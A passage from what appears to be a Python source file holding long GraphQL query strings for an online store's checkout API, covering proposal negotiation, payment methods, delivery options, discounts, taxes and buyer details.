AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}... on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}

"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{... on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}... on CheckpointDenied{redirectUrl __typename}... on Throttled{pollAfter queueToken pollUrl __typename}... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}... on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml... on RemoveTermViolation{target __typename}... on AcceptNewTermViolation{target __typename}... on ConfirmChangeViolation{from to __typename}... on UnprocessableTermViolation{target __typename}... on UnresolvableTermViolation{target __typename}... on ApplyChangeViolation{target from{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}to{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}__typename}... on GenericError{__typename}... on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{... on FilledBuyerIdentityTerms{email phone customer{... on CustomerProfile{email __typename}... on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename... on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{... on DiscountAllocatedAllocationSet{__typename allocations{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}... on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{... on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{... on MerchandiseLine{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseBundleLineComponent{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseLineComponentWithCapabilities{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{... on SourceProvidedMerchandise{__typename requiresShipping}... on ProductVariantMerchandise{__typename requiresShipping}... on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}... on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{... on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{... on LineComponentDiscountAllocation{allocation{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{... on PendingTerms{taskId pollDelay __typename}... on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{... on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}__typename}payment{... on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{... on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}... on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}... on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}... on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename... on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}... on WalletsPlatformConfiguration{name configurationParams __typename}... on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}... on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}... on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}... on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}... on ApplePayWalletConfig{__typename name supportedNetworks 